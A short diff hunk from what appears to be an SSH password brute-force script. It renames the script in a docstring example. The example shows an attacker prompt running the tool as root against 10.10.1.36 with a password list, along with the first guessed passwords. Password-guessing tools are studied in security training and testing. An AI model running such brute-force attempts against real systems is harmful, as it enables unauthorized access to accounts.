@@ -91,7 +91,7 @@ if __name__ == '__main__':
 '''
 Example run:
 
- attacker# python sshBrute.py -H 10.10.1.36 -u root -F pass.txt
+ attacker# python PxsshBruteForce.py -H 10.10.1.36 -u root -F pass.txt
  [-] Testing: 123456 
  [-] Testing: 12345 
  [-] Testing: 123456789 
